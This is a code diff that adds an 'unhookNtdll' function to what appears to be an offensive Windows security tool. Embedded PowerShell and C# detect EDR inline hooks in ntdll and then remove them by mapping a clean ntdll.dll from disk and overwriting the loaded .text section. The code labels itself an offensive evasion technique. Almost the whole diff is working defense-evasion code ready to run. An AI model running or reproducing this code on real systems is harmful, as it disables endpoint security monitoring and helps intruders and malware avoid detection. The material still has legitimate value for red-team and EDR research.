@@ -1791,3 +1791,226 @@ export async function stealthCheck(args: string[], timeout: number): Promise<Hoo
 
   return { output: output.join("\n"), findings }
 }
+
+export async function unhookNtdll(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "check"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] NTDLL unhooking — EDR hook removal...\n"]
+
+  if (action === "check") {
+    const script = `
+Write-Output "=== NTDLL Hook Detection ==="
+$ErrorActionPreference = 'SilentlyContinue'
+
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+using System.Diagnostics;
+
+public class HookDetect {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetModuleHandle(string name);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetProcAddress(IntPtr module, string name);
+    [DllImport("kernel32.dll")]
+    static extern bool ReadProcessMemory(IntPtr h, IntPtr addr, byte[] buf, int size, out int read);
+
+    public static string Check() {
+        var result = new System.Text.StringBuilder();
+        IntPtr ntdll = GetModuleHandle("ntdll.dll");
+        if (ntdll == IntPtr.Zero) { return "[-] Cannot load ntdll.dll"; }
+
+        string[] functions = new string[] {
+            "NtWriteVirtualMemory", "NtCreateThreadEx", "NtAllocateVirtualMemory",
+            "NtProtectVirtualMemory", "NtReadVirtualMemory", "NtCreateFile",
+            "NtOpenProcess", "NtMapViewOfSection", "NtQueueApcThread",
+            "NtCreateSection", "NtUnmapViewOfSection", "NtCreateProcess",
+            "NtWriteFile", "NtDeviceIoControlFile", "NtSetInformationThread",
+            "NtSuspendThread", "NtResumeThread", "NtAdjustPrivilegesToken"
+        };
+
+        int hooked = 0;
+        IntPtr h = Process.GetCurrentProcess().Handle;
+
+        foreach (string fn in functions) {
+            IntPtr addr = GetProcAddress(ntdll, fn);
+            if (addr == IntPtr.Zero) continue;
+
+            byte[] bytes = new byte[8];
+            int read;
+            ReadProcessMemory(h, addr, bytes, 8, out read);
+
+            bool isHooked = false;
+            string hookType = "";
+
+            if (bytes[0] == 0xE9) { isHooked = true; hookType = "JMP (relative)"; }
+            else if (bytes[0] == 0xFF && bytes[1] == 0x25) { isHooked = true; hookType = "JMP (indirect)"; }
+            else if (bytes[0] == 0x68) { isHooked = true; hookType = "PUSH+RET"; }
+            else if (bytes[0] == 0xEB) { isHooked = true; hookType = "JMP (short)"; }
+            else if (bytes[0] == 0xCC) { isHooked = true; hookType = "INT3 (breakpoint)"; }
+
+            string status = isHooked ? $"[!!!HOOKED] {hookType}" : "[CLEAN]";
+            string hex = BitConverter.ToString(bytes, 0, 6).Replace("-", " ");
+            result.AppendLine($"    {status} {fn}");
+            result.AppendLine($"         Bytes: {hex}");
+            if (isHooked) hooked++;
+        }
+
+        result.Insert(0, $"[*] Checked {functions.Length} functions, {hooked} hooked\\n\\n");
+        if (hooked > 0) {
+            result.AppendLine($"\\n[!] {hooked} EDR hooks detected — use 'unhook' action to remove");
+        } else {
+            result.AppendLine("\\n[+] No hooks detected — ntdll appears clean");
+        }
+        return result.ToString();
+    }
+}
+'@
+
+$result = [HookDetect]::Check()
+Write-Output $result
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EVASION-010",
+      provider: "windows",
+      severity: r.stdout.includes("HOOKED") ? "high" : "info",
+      status: "ENUMERATED",
+      resource: "ntdll://hooks",
+      title: "NTDLL userland hook detection — EDR inline hook analysis",
+      details: r.stdout.substring(0, 500),
+      remediation: "N/A — offensive tool. EDR hooks are a defensive mechanism.",
+    })
+  }
+
+  if (action === "unhook") {
+    const script = `
+Write-Output "=== NTDLL Unhooking — Fresh Copy from Disk ==="
+Write-Output ""
+
+Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+
+public class NtdllUnhook {
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetModuleHandle(string name);
+
+    [DllImport("ntdll.dll")]
+    static extern uint NtCreateSection(out IntPtr handle, uint access, IntPtr objAttr, ref long maxSize, uint pageProt, uint secAttr, IntPtr fileHandle);
+    [DllImport("ntdll.dll")]
+    static extern uint NtMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, ref long offset, ref IntPtr viewSize, uint inheritDisp, uint allocType, uint pageProt);
+    [DllImport("ntdll.dll")]
+    static extern uint NtUnmapViewOfSection(IntPtr process, IntPtr baseAddr);
+
+    [DllImport("kernel32.dll")]
+    static extern IntPtr CreateFileA(string name, uint access, uint share, IntPtr sec, uint disp, uint flags, IntPtr template);
+    [DllImport("kernel32.dll")]
+    static extern bool CloseHandle(IntPtr h);
+    [DllImport("kernel32.dll")]
+    static extern bool VirtualProtect(IntPtr addr, UIntPtr size, uint newProt, out uint oldProt);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr GetCurrentProcess();
+
+    [StructLayout(LayoutKind.Sequential)]
+    public struct IMAGE_DOS_HEADER {
+        public ushort e_magic;
+        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 29)]
+        public ushort[] e_padding;
+        public int e_lfanew;
+    }
+
+    public static string Unhook() {
+        var sb = new System.Text.StringBuilder();
+        IntPtr process = GetCurrentProcess();
+        IntPtr ntdll = GetModuleHandle("ntdll.dll");
+        if (ntdll == IntPtr.Zero) return "[-] Cannot get ntdll handle";
+
+        sb.AppendLine("[*] Step 1: Opening clean ntdll.dll from disk...");
+        string path = Environment.SystemDirectory + "\\\\ntdll.dll";
+        IntPtr fh = CreateFileA(path, 0x80000000, 1, IntPtr.Zero, 3, 0, IntPtr.Zero);
+        if (fh == (IntPtr)(-1)) return "[-] Cannot open ntdll.dll from disk";
+
+        sb.AppendLine("[*] Step 2: Creating section from clean ntdll...");
+        IntPtr section = IntPtr.Zero;
+        long maxSize = 0;
+        uint st = NtCreateSection(out section, 0x000F001F, IntPtr.Zero, ref maxSize, 0x02, 0x08000000, fh);
+        CloseHandle(fh);
+        if (st != 0) return $"[-] NtCreateSection failed: 0x{st:X8}";
+
+        sb.AppendLine("[*] Step 3: Mapping clean section...");
+        IntPtr cleanAddr = IntPtr.Zero;
+        IntPtr viewSize = IntPtr.Zero;
+        long off = 0;
+        st = NtMapViewOfSection(section, process, ref cleanAddr, IntPtr.Zero, IntPtr.Zero, ref off, ref viewSize, 1, 0, 0x02);
+        if (st != 0) return $"[-] NtMapViewOfSection failed: 0x{st:X8}";
+
+        sb.AppendLine($"[+] Clean ntdll mapped at: 0x{cleanAddr.ToInt64():X}");
+
+        sb.AppendLine("[*] Step 4: Parsing PE headers and overwriting .text...");
+        var dos = Marshal.PtrToStructure<IMAGE_DOS_HEADER>(cleanAddr);
+        IntPtr peBase = new IntPtr(cleanAddr.ToInt64() + dos.e_lfanew + 4);
+        ushort secCount = Marshal.ReadInt16(new IntPtr(peBase.ToInt64() + 2));
+        ushort optSize = Marshal.ReadInt16(new IntPtr(peBase.ToInt64() + 16));
+        IntPtr secTable = new IntPtr(peBase.ToInt64() + 20 + optSize);
+
+        int replaced = 0;
+        for (int i = 0; i < secCount; i++) {
+            IntPtr se = new IntPtr(secTable.ToInt64() + i * 40);
+            byte[] nb = new byte[8];
+            Marshal.Copy(se, nb, 0, 8);
+            string nm = System.Text.Encoding.ASCII.GetString(nb).TrimEnd('\\0');
+            if (nm == ".text") {
+                uint vs = (uint)Marshal.ReadInt32(new IntPtr(se.ToInt64() + 8));
+                uint va = (uint)Marshal.ReadInt32(new IntPtr(se.ToInt64() + 12));
+                IntPtr hookedText = new IntPtr(ntdll.ToInt64() + va);
+                IntPtr cleanText = new IntPtr(cleanAddr.ToInt64() + va);
+                uint oldProt;
+                VirtualProtect(hookedText, (UIntPtr)vs, 0x40, out oldProt);
+                byte[] clean = new byte[vs];
+                Marshal.Copy(cleanText, clean, 0, (int)vs);
+                Marshal.Copy(clean, 0, hookedText, (int)vs);
+                VirtualProtect(hookedText, (UIntPtr)vs, oldProt, out oldProt);
+                sb.AppendLine($"[+] .text replaced: {vs} bytes at RVA 0x{va:X}");
+                replaced++;
+                break;
+            }
+        }
+
+        NtUnmapViewOfSection(process, cleanAddr);
+        CloseHandle(section);
+
+        if (replaced > 0) {
+            sb.AppendLine("");
+            sb.AppendLine("[+] NTDLL unhooked — all EDR inline hooks removed");
+            sb.AppendLine("[*] Nt* functions now execute original syscall stubs");
+        } else {
+            sb.AppendLine("[-] .text section not found");
+        }
+        return sb.ToString();
+    }
+}
+'@
+
+$result = [NtdllUnhook]::Unhook()
+Write-Output $result
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    if (r.stderr) output.push(`[!] ${r.stderr}`)
+    findings.push({
+      checkId: "WIN-EVASION-011",
+      provider: "windows",
+      severity: "high",
+      status: r.stdout.includes("unhooked") ? "EXECUTED" : "FAILED",
+      resource: "ntdll://unhook",
+      title: "NTDLL unhooking via fresh disk copy — EDR hook removal",
+      details: r.stdout.substring(0, 500),
+      remediation: "N/A — offensive evasion technique. EDR vendors should use kernel callbacks instead of userland hooks.",
+    })
+  }
+
+  return { output: output.join("\n"), findings }
+}
